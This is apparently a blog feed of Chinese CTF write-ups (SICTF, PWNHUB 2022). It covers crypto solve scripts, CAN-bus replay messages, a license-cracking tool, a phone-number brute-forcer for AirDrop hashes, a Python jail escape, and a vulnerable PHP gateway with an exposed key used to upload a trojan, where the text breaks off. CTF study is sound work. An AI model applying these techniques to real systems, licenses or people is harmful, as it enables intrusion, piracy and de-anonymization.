&gt;&gt; (j * <span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xFF</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//flag&#123;t5a_1s_very_n1C5!!&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Osint"><a href="#Osint" class="headerlink" title="Osint"></a>Osint</h1><h4 id="朋友圈中的秘密"><a href="#朋友圈中的秘密" class="headerlink" title="朋友圈中的秘密"></a>朋友圈中的秘密</h4><p><img src="/mdimg/sictf/308.png"><br><strong>面向出题人做题法：</strong><br><strong>一眼丁真汉堡王（桌子上的可乐）</strong><br>地图查找左上角的商家（顺义区）（树木是顺义区的）<br>范围很小，一个一个试就行<br><img src="/mdimg/sictf/39.png"><code>SICTF&#123;北京市-顺义区-新顺南大街-11号-汉堡王&#125;                        </code></p><h4 id="小镇后面的山"><a href="#小镇后面的山" class="headerlink" title="小镇后面的山"></a>小镇后面的山</h4><p><img src="/mdimg/sictf/40.png"><br>直接google识图<br><img src="/mdimg/sictf/41.png"><br>随便搜都能找到，然后查了一下这个地方，确实有一个大学<br><a href="https://www.adventurouskate.com/grenoble-on-a-perfect-winter-day/">https://www.adventurouskate.com/grenoble-on-a-perfect-winter-day/</a><br><code>SICTF&#123;格勒诺布尔-阿尔卑斯山脉&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022PWNHUB冬季赛</title>
    <link href="/2023/02/05/2022PWNHUB%E5%86%AC%E5%AD%A3%E8%B5%9BWrite%20Up/"/>
    <url>/2023/02/05/2022PWNHUB%E5%86%AC%E5%AD%A3%E8%B5%9BWrite%20Up/</url>
    
    <content type="html"><![CDATA[<p><img src="/mdimg/2022PWNHUB/1671426618514.jpg"></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="ASR"><a href="#ASR" class="headerlink" title="ASR"></a>ASR</h2><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br>m = bytes_to_long(flag)<br><br>R = getPrime(<span class="hljs-number">256</span>)<br>S = getPrime(<span class="hljs-number">512</span>)<br>A = getPrime(<span class="hljs-number">1024</span>)<br><br>N = R * S * A<br>c = <span class="hljs-built_in">pow</span>(m, <span class="hljs-number">0x10001</span>, N)<br><br>RA = R &amp; A<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;RSA1&#x27;</span>,<span class="hljs-built_in">hex</span>(RA * S))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;RSA2&#x27;</span>,<span class="hljs-built_in">hex</span>(RA | S))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-built_in">hex</span>(c))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;N&#x27;</span>,<span class="hljs-built_in">hex</span>(N))<br><br><span class="hljs-comment"># RSA1 0x97be543979cb98c109103fa118c1c930ff13a6b2562166417021afd6e46cb0837a5cc5f4094fcea5fcc33efdfa495050e0fb8269922b3ee2d403210ed1ba339af2dc3d4e8952f0c784fcc655436cf255b98cdaf8080df47f6c28bc0bae68c713</span><br><span class="hljs-comment"># RSA2 0xa887aa84f3a0bd8b79ed59a7bb98d8e58a85414f85cf2ddf53ff4bd9294bfdadf7d6d6adfe7fbed55fc71b5a6bfcfe79ced27e2f41e7546a8679daf5b63dda37</span><br><span class="hljs-comment"># c 0x2f62fb7e7e8e27823193119f8412050ade9084ade25261a5875da23a07d5d5145e72d460697984d8aa668a25822009a4fdc85df2b208941cd3219b312f21c3c7bc4ef7aa8c18b4f91a0e815fe1892fca0f72406e571fbd0fea2c4710c601165ccd7e8a5a828721a5e2c956b732223d683d1413ef393b5f80a431c52bf9099e22b8e27daafb9d3e055242b89b5419b8925744ccf348e1bea519225af8efe7dbcc202425251039cbfe6b892a7fcf7e9d72224ea9381e3fb32ab837139af4b4112a3c7a6571c88e7d6c5db4c3f91e25edd15eb5544ef2f29a9e1bb1062ec86f1902</span><br><span class="hljs-comment"># N 0x58a7ff25292651e1a8d82656d64fe3b458d6e688405e85aa6c02e0c33469ad3dbaef6c6eaf8faf22f2d15e80856ab7b90a40fd50c36f7b59932bc94e6fb4fabefa87b11bf4ef74df4ccf8d254f0c6812628df3c5b3786af35e3dde9c87b462d1a565af6f100750718ccb7235174947f00cec5836765150f1680d0c58a5f9ea2473a6033c218c75664dc53377dde9386f37e1a89d77e61a716129d290c5a41f81cd3490bab6fe51f232ab27cb1ac9c8eb88e908c12109a125b7439c25b6879283a17a3467823fbb089709eb836cfd03386cc4bf186eb45401472ab0bdec605fd7</span><br></code></pre></td></tr></table></figure><p>非预期解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>RSA1=<span class="hljs-number">0x97be543979cb98c109103fa118c1c930ff13a6b2562166417021afd6e46cb0837a5cc5f4094fcea5fcc33efdfa495050e0fb8269922b3ee2d403210ed1ba339af2dc3d4e8952f0c784fcc655436cf255b98cdaf8080df47f6c28bc0bae68c713</span><br>RSA2=<span class="hljs-number">0xa887aa84f3a0bd8b79ed59a7bb98d8e58a85414f85cf2ddf53ff4bd9294bfdadf7d6d6adfe7fbed55fc71b5a6bfcfe79ced27e2f41e7546a8679daf5b63dda37</span><br>c=<span class="hljs-number">0x2f62fb7e7e8e27823193119f8412050ade9084ade25261a5875da23a07d5d5145e72d460697984d8aa668a25822009a4fdc85df2b208941cd3219b312f21c3c7bc4ef7aa8c18b4f91a0e815fe1892fca0f72406e571fbd0fea2c4710c601165ccd7e8a5a828721a5e2c956b732223d683d1413ef393b5f80a431c52bf9099e22b8e27daafb9d3e055242b89b5419b8925744ccf348e1bea519225af8efe7dbcc202425251039cbfe6b892a7fcf7e9d72224ea9381e3fb32ab837139af4b4112a3c7a6571c88e7d6c5db4c3f91e25edd15eb5544ef2f29a9e1bb1062ec86f1902</span><br>N=<span class="hljs-number">0x58a7ff25292651e1a8d82656d64fe3b458d6e688405e85aa6c02e0c33469ad3dbaef6c6eaf8faf22f2d15e80856ab7b90a40fd50c36f7b59932bc94e6fb4fabefa87b11bf4ef74df4ccf8d254f0c6812628df3c5b3786af35e3dde9c87b462d1a565af6f100750718ccb7235174947f00cec5836765150f1680d0c58a5f9ea2473a6033c218c75664dc53377dde9386f37e1a89d77e61a716129d290c5a41f81cd3490bab6fe51f232ab27cb1ac9c8eb88e908c12109a125b7439c25b6879283a17a3467823fbb089709eb836cfd03386cc4bf186eb45401472ab0bdec605fd7</span><br><br>S=GCD(RSA1,N)<br>d=inverse(<span class="hljs-number">0x10001</span>,S-<span class="hljs-number">1</span>)<br>m=<span class="hljs-built_in">pow</span>(c,d,S)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:]))<br><span class="hljs-comment">#flag&#123;b66f68258f184bd7afddd32c1518eed0&#125;</span><br></code></pre></td></tr></table></figure><p>预期解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>RSA1=<span class="hljs-number">0x97be543979cb98c109103fa118c1c930ff13a6b2562166417021afd6e46cb0837a5cc5f4094fcea5fcc33efdfa495050e0fb8269922b3ee2d403210ed1ba339af2dc3d4e8952f0c784fcc655436cf255b98cdaf8080df47f6c28bc0bae68c713</span><br>RSA2=<span class="hljs-number">0xa887aa84f3a0bd8b79ed59a7bb98d8e58a85414f85cf2ddf53ff4bd9294bfdadf7d6d6adfe7fbed55fc71b5a6bfcfe79ced27e2f41e7546a8679daf5b63dda37</span><br>c=<span class="hljs-number">0x2f62fb7e7e8e27823193119f8412050ade9084ade25261a5875da23a07d5d5145e72d460697984d8aa668a25822009a4fdc85df2b208941cd3219b312f21c3c7bc4ef7aa8c18b4f91a0e815fe1892fca0f72406e571fbd0fea2c4710c601165ccd7e8a5a828721a5e2c956b732223d683d1413ef393b5f80a431c52bf9099e22b8e27daafb9d3e055242b89b5419b8925744ccf348e1bea519225af8efe7dbcc202425251039cbfe6b892a7fcf7e9d72224ea9381e3fb32ab837139af4b4112a3c7a6571c88e7d6c5db4c3f91e25edd15eb5544ef2f29a9e1bb1062ec86f1902</span><br>N=<span class="hljs-number">0x58a7ff25292651e1a8d82656d64fe3b458d6e688405e85aa6c02e0c33469ad3dbaef6c6eaf8faf22f2d15e80856ab7b90a40fd50c36f7b59932bc94e6fb4fabefa87b11bf4ef74df4ccf8d254f0c6812628df3c5b3786af35e3dde9c87b462d1a565af6f100750718ccb7235174947f00cec5836765150f1680d0c58a5f9ea2473a6033c218c75664dc53377dde9386f37e1a89d77e61a716129d290c5a41f81cd3490bab6fe51f232ab27cb1ac9c8eb88e908c12109a125b7439c25b6879283a17a3467823fbb089709eb836cfd03386cc4bf186eb45401472ab0bdec605fd7</span><br><br>offset = <span class="hljs-number">256</span><br>RSA2 &gt;&gt;= offset<br>RSA2 &lt;&lt;= offset<br><br>PR.&lt;x&gt; = PolynomialRing(Zmod(RSA1))<br>f = x + RSA2<br>roots = f.small_roots(X=<span class="hljs-number">2</span>^offset, beta = <span class="hljs-number">0.4</span>)<br>S = RSA2 + roots[<span class="hljs-number">0</span>]<br>S = <span class="hljs-built_in">int</span>(S)<br><br>cc = <span class="hljs-built_in">int</span>(c % S)<br><span class="hljs-built_in">print</span>(cc)<br>d = <span class="hljs-built_in">int</span>(inverse(<span class="hljs-number">0x10001</span>, S-<span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(cc,d,S)))<br></code></pre></td></tr></table></figure><h2 id="大杂烩"><a href="#大杂烩" class="headerlink" title="大杂烩"></a>大杂烩</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-number">1755716071599</span><br>N = <span class="hljs-number">236038564943567983056828121309828109017</span><br>Px, Py =<br>b = ZZ((Py**<span class="hljs-number">2</span> - Px**<span class="hljs-number">3</span> - a * Px) % N)<br>e = (b&lt;&lt;<span class="hljs-number">42</span>) + a<br><br>enc1 = <span class="hljs-number">98662590652068949920571979585725979127266112216583776160769090971169664292493813021843624362593669574513220457664819153878956311077379392531742253343961645534972639309537402874636739745717765969720117162780620981639015788423324884640935466801234207019510919768602974162878323777374364290185048275714332671356</span><br>enc2 = <span class="hljs-number">58738699705013897273174837829098879580829898980458718341881900446701910685043213698485036350888862454440118347362218485065377354137391792039111639199258042591959084091242821874819864955504791788260187064338245516327147327866373690756260239728218244294166383516151782123688633986853602732137707507845681977204</span><br>NN = <span class="hljs-number">149794788177729409820185150543033616327574456754306207341321223589733698623477041345453230785413920341465642754285280273761269552897080096162195035057667200692677841848045965505750839903359478511509753781737513122660495056746669041957643882516287304836822410136985711091802722010788615177574143908444311475347</span><br>M = matrix(ZZ, [<br>    [<span class="hljs-number">2</span>**<span class="hljs-number">256</span>, enc1, enc2],<br>    [<span class="hljs-number">0</span>, NN, <span class="hljs-number">0</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, NN]<br>])<br>L = M.LLL()<br>hd, ld = L[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>], L[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>]<br>d = (hd&lt;&lt;<span class="hljs-number">512</span>) + ld<br><br>n = <span class="hljs-number">236038564943567983056828121309828109017</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, e*d, n) == <span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    k = e * d - <span class="hljs-number">1</span><br>    g = randint(<span class="hljs-number">2</span>, n - <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        x = <span class="hljs-built_in">pow</span>(g, k, n)<br>        <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> n &gt; GCD(x - <span class="hljs-number">1</span>, n) &gt; <span class="hljs-number">1</span>:<br>            p = GCD(x - <span class="hljs-number">1</span>, n)<br>            q = n // p<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;p = &#125;</span>\n<span class="hljs-subst">&#123;q = &#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(p * q == n)<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>                <span class="hljs-built_in">print</span>(long_to_bytes(p &gt;&gt; i))<br>                <span class="hljs-built_in">print</span>(long_to_bytes(q &gt;&gt; i))<br>            exit()<br>        <span class="hljs-keyword">if</span> k % <span class="hljs-number">2</span>:<span class="hljs-keyword">break</span><br>        k //= <span class="hljs-number">2</span><br><span class="hljs-comment"># flag&#123;e89f47939d12434cb201080d8b240774&#125;</span><br></code></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="飞驰人生"><a href="#飞驰人生" class="headerlink" title="飞驰人生"></a>飞驰人生</h2><p>前置知识<br><code>[https://www.anquanke.com/post/id/106409?from=timeline#h2-1](https://www.anquanke.com/post/id/106409?from=timeline#h2-1)</code><br>CAN报文分析，使用重放攻击解题<br><code>[http://www.hackdig.com/09/hack-771228.htm](http://www.hackdig.com/09/hack-771228.htm)</code><br>需要去GitHub下载最新版can-utils才能实现挨个手调<br><code>[GitHub - linux-can/can-utils: Linux-CAN / SocketCAN user space applications](https://github.com/linux-can/can-utils)</code><br>查看日志 将异常流量提取出来可以更快的调试完毕<br>直接筛选244#（油门流量）的异常流量去进行手调<br><code>./canplayer -I ./xxx.txt -v -i</code>逐行调试命令<br><img src="/mdimg/2022PWNHUB/1671280983003.png"><br><img src="/mdimg/2022PWNHUB/1671281025564.png"><br>表盘在此发生突变所以报文异常为<code>244#000000A60000</code><br>结合一道国外CAN报文题目可以得知<code>19B#00000F000000</code>为门锁攻击异常流量<br><img src="/mdimg/2022PWNHUB/1671353189895.png"><br>没想到直接交就对了 还没来得及对门锁流量进行调试  还需要对can-utils源码进行更深入学习才行 太菜了<br><code>flag&#123;19B#00000F000000_244#000000A60000&#125;</code></p><h2 id="证书里也有秘密"><a href="#证书里也有秘密" class="headerlink" title="证书里也有秘密"></a>证书里也有秘密</h2><p>使用 -h 查看帮助</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> &gt; .\xray<span class="hljs-literal">-cracker</span> <span class="hljs-literal">-h</span><br>破解xray高级版证书，使用 <span class="hljs-literal">-h</span> 参数查看使用帮助<br><br>Usage of xray<span class="hljs-literal">-cracker</span>:<br><span class="hljs-literal">-c</span> string<br>替换xray程序内置公钥，需要指定xray程序文件路径<br><span class="hljs-literal">-g</span> string<br>生成一个永久license，需要指定用户名<br><span class="hljs-literal">-p</span> string<br>解析官方证书，需要指定证书路径<br><br></code></pre></td></tr></table></figure><p>使用<code>.\xray-cracker -p xray-license.lic</code>查看即可<br><code>flag&#123;3270cdada4eb4a809d25ff4820d5a1f7&#125;</code></p><h2 id="空投之王"><a href="#空投之王" class="headerlink" title="空投之王"></a>空投之王</h2><p>下载附件后一眼Airdrop取证（小姐姐好看捏）  感谢Qsugar师傅送的盘古石<br>导入日志文件<br><img src="/mdimg/2022PWNHUB/6bccea041523f122f7dff78a999130d.png"><br>利用盘古石 Airdrop 哈希转换工具得到手机号码<br><img src="/mdimg/2022PWNHUB/11481d495e07b31136a6cb8af72db65.png"><code>flag&#123;18800009527&#125;</code><br>爆破脚本 爆破速度感人</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>targetstart = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;[+] Enter the target hash start fragment: &#x27;</span>)<br>targetend = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;[+] Enter the target hash end fragment: &#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Checking all Chinese areacode&#x27;</span>)<br>areacodelist = [<span class="hljs-string">&#x27;139&#x27;</span>, <span class="hljs-string">&#x27;138&#x27;</span>, <span class="hljs-string">&#x27;137&#x27;</span>, <span class="hljs-string">&#x27;136&#x27;</span>, <span class="hljs-string">&#x27;135&#x27;</span>, <span class="hljs-string">&#x27;134&#x27;</span>, <span class="hljs-string">&#x27;159&#x27;</span>, <span class="hljs-string">&#x27;158&#x27;</span>,<span class="hljs-string">&#x27;157&#x27;</span>,<span class="hljs-string">&#x27;150&#x27;</span>,<span class="hljs-string">&#x27;151&#x27;</span>, <span class="hljs-string">&#x27;152&#x27;</span>, <span class="hljs-string">&#x27;188&#x27;</span>, <span class="hljs-string">&#x27;187&#x27;</span>, <span class="hljs-string">&#x27;182&#x27;</span>, <span class="hljs-string">&#x27;183&#x27;</span>, <span class="hljs-string">&#x27;184&#x27;</span>, <span class="hljs-string">&#x27;178&#x27;</span>]<br>phonematch = []<br><br><span class="hljs-keyword">for</span> areacode <span class="hljs-keyword">in</span> areacodelist:<br>    line = <span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Searching area code &#x27;</span> + areacode + <span class="hljs-string">&#x27; for target...&#x27;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">int</span>(line) &lt; <span class="hljs-number">100000000</span>:<br>        targetphone = <span class="hljs-string">&#x27;86&#x27;</span> + <span class="hljs-built_in">str</span>(areacode) + <span class="hljs-built_in">str</span>(line).zfill(<span class="hljs-number">8</span>)<br>        targettest = hashlib.sha256(targetphone.encode())<br>        starthashcheck = targettest.hexdigest() [<span class="hljs-number">0</span>:<span class="hljs-number">5</span>]<br>        endhashcheck = targettest.hexdigest() [-<span class="hljs-number">5</span>:]<br>        <span class="hljs-keyword">if</span> starthashcheck == targetstart.lower() <span class="hljs-keyword">and</span> endhashcheck ==targetend.lower():<br>            phonematch.append(targetphone)<br>            <span class="hljs-built_in">print</span>(targetphone + <span class="hljs-string">&#x27; matches hash fragments. Stillchecking...&#x27;</span>)<br>        line = <span class="hljs-built_in">int</span>(line) + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">int</span>(line) == <span class="hljs-number">100000000</span>:<br>            <span class="hljs-keyword">break</span><br><span class="hljs-keyword">if</span> phonematch:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your target\&#x27;s phone number may be:&#x27;</span>)<br>    <span class="hljs-keyword">for</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">in</span> phonematch:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-keyword">match</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Target phone number not found in this area code set. Targetphone may use another country code.&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="坐井观天"><a href="#坐井观天" class="headerlink" title="坐井观天"></a>坐井观天</h2><p>可以使⽤的字符有``string.ascii_letters + string.digits + “,!?;#+-/$@&amp;|~^&lt;&gt;(){}”<code> 这些⽅法</code>“getattr”, “exec”, “open”, “<strong>builtins</strong>“, “<strong>build_class</strong>“, “<strong>loader</strong>“, “<strong>spec</strong>“<code>都被 禁⽤了，那么这个时候可以选择⽤</code>chr()<code>来绕过，当然也可以⽤</code>eval(input())`绕过。<br><img src="/mdimg/2022PWNHUB/1671287243843.png"><br><img src="/mdimg/2022PWNHUB/1671589681536.png"></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="justJS"><a href="#justJS" class="headerlink" title="justJS"></a>justJS</h2><p>非预期了。。。<br><img src="/mdimg/2022PWNHUB/1671280829207.png"></p><h1 id="GAMING"><a href="#GAMING" class="headerlink" title="GAMING"></a>GAMING</h1><h2 id="游戏来咯"><a href="#游戏来咯" class="headerlink" title="游戏来咯"></a>游戏来咯</h2><p>注册账号登录即可get flag</p><h2 id="攻城拔寨"><a href="#攻城拔寨" class="headerlink" title="攻城拔寨"></a>攻城拔寨</h2><p>修改器直接改<br><img src="/mdimg/2022PWNHUB/1.png"><br>将官职修改到督邮以上<br><img src="/mdimg/2022PWNHUB/2.png"><br>重新登陆，查看邮箱<br><img src="/mdimg/2022PWNHUB/3.png"></p><h2 id="特殊玩家"><a href="#特殊玩家" class="headerlink" title="特殊玩家"></a>特殊玩家</h2><p><img src="/mdimg/2022PWNHUB/4.png"></p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>打开附件在<code>APMServ5.2.6&gt;www&gt;htdocs&gt;server&gt;game&gt;BattleNetGateway.php</code><br>可以看到存在漏洞，可以上传文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php   <br>require_once(<span class="hljs-string">&quot;interface.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;utils.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;BattleFunc.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;HeroFunc.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;BattleNetServices.php&quot;</span>);<br>define(<span class="hljs-string">&quot;BATTLE_NET_KEY&quot;</span>,<span class="hljs-string">&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;</span>);<br><span class="hljs-keyword">if</span> (!defined(<span class="hljs-string">&#x27;PATH_SEPARATOR&#x27;</span>)) &#123;<span class="hljs-keyword">if</span> (substr(PHP_OS, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>) == <span class="hljs-string">&#x27;WIN&#x27;</span>) define(<span class="hljs-string">&#x27;PATH_SEPARATOR&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>); <span class="hljs-keyword">else</span> define(<span class="hljs-string">&#x27;PATH_SEPARATOR&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>);&#125; <br>ini_set(<span class="hljs-string">&#x27;include_path&#x27;</span>,ini_get(<span class="hljs-string">&#x27;include_path&#x27;</span>).PATH_SEPARATOR.realpath(<span class="hljs-string">&quot;../&quot;</span>));     <br><br>$param=$_POST;<br><span class="hljs-keyword">if</span>(empty($param))$param=$_GET;      <br>$from_uid=$param[<span class="hljs-string">&quot;from_uid&quot;</span>];   <br>$sign=$param[<span class="hljs-string">&quot;sign&quot;</span>];<br>$commandFunc=$param[<span class="hljs-string">&quot;commandFunc&quot;</span>];<br>$content=urldecode($param[<span class="hljs-string">&quot;content&quot;</span>]);<br>$content_encoding=$param[<span class="hljs-string">&quot;content-encoding&quot;</span>];<br>//$tt=$from_uid.$commandFunc.$content.BATTLE_NET_KEY;<br><br><br><br>$ret=array();<br><span class="hljs-keyword">if</span>($sign!=md5($from_uid.$commandFunc.$content.BATTLE_NET_KEY)) <br>$ret[]=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">else</span>&#123;<br>    $ret[]=<span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">try</span>&#123;<br>    <span class="hljs-keyword">if</span>($content_encoding==<span class="hljs-string">&quot;csv&quot;</span>)&#123;<br>$inputParams=explode(<span class="hljs-string">&quot;|&quot;</span>,$content);<br><span class="hljs-keyword">if</span>(count($inputParams)==<span class="hljs-number">1</span>)&#123;<br>    $inputParams=$inputParams[<span class="hljs-number">0</span>];<br>&#125;<br>$ret[]=$commandFunc($from_uid,$inputParams);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    $inputParams=json_decode($content,true);<br><span class="hljs-keyword">if</span>(is_array($inputParams)&amp;&amp;count($inputParams)==<span class="hljs-number">1</span>)&#123;<br>    $inputParams=array_shift($inputParams);<br>&#125;<br>$ret[]=$commandFunc($from_uid,$inputParams); <br>&#125;<br>&#125;catch(Exception $e)&#123;<br>    $ret = array(<span class="hljs-number">0</span>=&gt;<span class="hljs-number">0</span>);<br>$ret[] = $e-&gt;getMessage();<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>($content_encoding==<span class="hljs-string">&quot;csv&quot;</span>)&#123;<br><span class="hljs-built_in">print</span> implode(<span class="hljs-string">&quot;|&quot;</span>,$ret);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-built_in">print</span> json_encode($ret);<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>看到密钥</p><p><code>define(&quot;BATTLE_NET_KEY&quot;,&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;);</code><br>上传一个木马</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 